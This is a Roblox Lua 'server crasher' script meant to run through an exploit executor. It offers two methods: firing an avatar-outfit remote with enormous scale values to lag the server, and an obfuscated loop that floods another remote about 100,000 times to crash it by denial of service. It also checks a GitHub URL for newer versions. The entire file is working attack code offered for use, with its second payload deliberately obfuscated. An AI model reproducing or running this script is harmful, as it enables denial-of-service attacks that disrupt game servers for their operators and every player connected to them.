-- Server crasher script

--[[

There are currently 2 methods:
1st) Original crash script, it mainly lags the server instead of crashing it
2nd) New crash script, it crashes the server by DOSing the server

]]--

local Level2Execution = true -- Turn this on only if you have a lvl 2 executor without HTTP support and custom functions or the script doesnt run on your executor

local latestVersion:number = 2.0
local method:number = 2
local size:number = 100000 -- only for 1st method

-- Dont change anything below

if Level2Execution == false then
	latestVersion = tonumber(game:HttpGet("https://raw.githubusercontent.com/SourceDNR/Apollo/refs/heads/main/extra/newestCrasherVersion"))
end
task.wait(1)
local version = 2.0

local function randomString()
	local length = math.random(60,80)
	local Table = {}
	for i = 1, length do
		Table[i] = string.char(math.random(32, 126))
	end
	return table.concat(Table)
end

local function message(text:string, duration:number)
	if Level2Execution == false then
		task.spawn(function()
			local hint = Instance.new("Hint", game:GetService("CoreGui"))
			hint.Name = randomString()
			hint.Text = text
			wait(duration)
			hint:Destroy()
		end)
	else
		task.spawn(function()
			local hint = Instance.new("Hint", game:GetService("Workspace"))
			hint.Name = randomString()
			hint.Text = text
			wait(duration)
			hint:Destroy()
		end)
	end
end

if version < latestVersion then
	if setclipboard then
		setclipboard(game:HttpGet("https://raw.githubusercontent.com/SourceDNR/Apollo/refs/heads/main/ServerCrasher.lua"))
		message("You're running an outdated version of this script, the new script has been copied to your clipboard.", 10)
		task.wait(10)
		error("l")
	else
		message("You're running an outdated version of this script, please use the new script (Github account: SourceDNR)", 10)
		task.wait(10)
		error("l")
	end
end

task.wait(10)

if method == 1 then
	message("Crashing server in 5 seconds | Method selected: ".. method, 5)
	task.wait(5)
	local args = {
		[1] = {
			["SwimAnimation"] = 0,
			["DepthScale"] = size - (size / 5),
			["RightLegColor"] = Color3.new(0.6392157077789307, 0.6352941393852234, 0.6470588445663452),
			["MoodAnimation"] = 14618207727,
			["Face"] = 0,
			["JumpAnimation"] = 0,
			["HeadColor"] = Color3.new(0.6392157077789307, 0.6352941393852234, 0.6470588445663452),
			["BodyTypeScale"] = 0,
			["ClimbAnimation"] = 0,
			["LeftArmColor"] = Color3.new(0.6392157077789307, 0.6352941393852234, 0.6470588445663452),
			["LeftLegColor"] = Color3.new(0.6392157077789307, 0.6352941393852234, 0.6470588445663452),
			["Pants"] = 0,
			["RightArmColor"] = Color3.new(0.6392157077789307, 0.6352941393852234, 0.6470588445663452),
			["WidthScale"] = size - (size / 5),
			["LeftArm"] = 17714601898,
			["IdleAnimation"] = 0,
			["RightArm"] = 17714600336,
			["GraphicTShirt"] = 0,
			["Head"] = 17714599711,
			["Shirt"] = 0,
			["Torso"] = 17714600331,
			["RunAnimation"] = 0,
			["WalkAnimation"] = 0,
			["FallAnimation"] = 0,
			["TorsoColor"] = Color3.new(0.6392157077789307, 0.6352941393852234, 0.6470588445663452),
			["Accessories"] = {},
			["RightLeg"] = 17714600593,
			["HeadScale"] = size,
			["HeightScale"] = size,
			["ProportionScale"] = 0,
			["LeftLeg"] = 17714599961
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit"):FireServer(unpack(args))

	while task.wait() do
		if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead) 
		end
	end
else
	message("Crashing server in 5 seconds | Method selected: ".. method, 5)
	task.wait(5)
	local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v14=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v14,v14 + 1 )),v1(v2(v9,1 + (v14% #v9) ,1 + (v14% #v9) + 1 )))%256 ));end return v5(v10);end for v11=1 -0 ,142559 -42559  do local v12=1065 -(68 + 997) ;local v13;while true do if (v12==(1271 -(226 + 1044))) then task.wait();break;end if ((0 -0)==v12) then v13={[118 -(32 + 85) ]=v7("\243\209\206\49","\126\177\163\187\69\134\219\167")};game:GetService(v7("\17\200\58\201\245\32\204\62\192\248\16\217\37\215\253\36\200","\156\67\173\74\165")):WaitForChild(v7("\17\161\76\24\168\53","\38\84\215\41\118\220\70")):WaitForChild(v7("\115\30\35\0\255\83\2\39\0\219\70\19\44\6","\158\48\118\66\114")):FireServer(unpack(v13));v12=1 + 0 ;end end end
end
